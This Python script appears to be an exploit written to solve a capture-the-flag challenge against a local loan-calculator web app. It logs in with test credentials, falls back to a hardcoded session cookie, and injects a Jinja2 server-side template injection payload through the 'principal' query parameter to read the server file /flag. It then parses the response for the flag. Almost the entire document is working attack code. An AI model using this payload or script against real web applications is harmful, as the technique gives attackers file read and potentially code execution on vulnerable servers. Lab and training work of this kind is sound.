import requests
import json
import re

# Target URL
base_url = "http://127.0.0.1:32841"

# Step 1: Login to get session
try:
    print("[+] Attempting login with credentials test:test...")
    login_data = {
        'username': 'test',
        'password': 'test'
    }
    login_response = requests.post(f"{base_url}/login", data=login_data, allow_redirects=False)
    print(f"[+] Login status: {login_response.status_code}")
    
    # Extract session cookie
    if 'Set-Cookie' in login_response.headers:
        session_cookie = login_response.headers['Set-Cookie']
        print(f"[+] Session cookie received: {session_cookie}")
    else:
        # Use existing cookie if login doesn't return a new one
        session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVtEcw.vtxsg2V0gHHl7Kfzqp8OUXiB9rs"
        print(f"[!] No session cookie from login, using existing: {session_cookie}")
except Exception as e:
    print(f"[!] Login error: {e}")
    session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVtEcw.vtxsg2V0gHHl7Kfzqp8OUXiB9rs"

# Step 2: Prepare SSTI payload in principal only
ssti_payload = "{{ lipsum.__globals__.__builtins__.open(\"/flag\").read() }}"
print(f"\n[+] Using SSTI payload: {ssti_payload}")

# Step 3: Send GET request with all required parameters
# SSTI payload goes in 'principal', dummy values for 'payment' and 'term'
try:
    print(f"\n[+] Sending GET request to /total_loan_payments with SSTI payload...")
    headers = {
        'Cookie': session_cookie
    }
    
    params = {
        'principal': ssti_payload,
        'payment': '1000',  # Dummy value
        'term': '12'         # Dummy value
    }
    
    print(f"[+] Parameters: {params}")
    
    response = requests.get(
        f"{base_url}/total_loan_payments",
        params=params,
        headers=headers
    )
    
    print(f"[+] Response status: {response.status_code}")
    print(f"[+] Response headers: {dict(response.headers)}")
    print(f"[+] Response length: {len(response.content)} bytes")
    
    # Step 4: Print complete JSON response
    try:
        response_json = response.json()
        print(f"\n[+] Complete JSON Response:\n{json.dumps(response_json, indent=2)}")
    except:
        print(f"[+] Response (not JSON):\n{response.text[:1000]}")
        response_json = None
    
    # Step 5: Extract and display flag
    if response_json:
        # Check loan_principal field specifically
        if 'loan_principal' in response_json:
            loan_principal_value = response_json['loan_principal']
            flag_match = re.search(r'FLAG\{[^}]+\}', str(loan_principal_value))
            if flag_match:
                print(f"\n{'='*60}")
                print(f"[!] FLAG FOUND: {flag_match.group()}")
                print(f"{'='*60}")
                print(f"[+] Verbatim line from loan_principal: {loan_principal_value}")
        
        # Check all fields for flag
        print(f"\n[+] Searching entire response for FLAG pattern...")
        response_str = json.dumps(response_json)
        flag_match_full = re.search(r'FLAG\{[^}]+\}', response_str)
        if flag_match_full:
            print(f"[!] FLAG FOUND IN RESPONSE: {flag_match_full.group()}")
    else:
        print(f"[ ] No valid JSON response, checking raw text...")
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND IN RAW RESPONSE: {flag_match.group()}")
        else:
            print(f"[ ] No FLAG pattern found in raw response")

except Exception as e:
    print(f"[!] Error during request: {e}")
    import traceback
    traceback.print_exc()

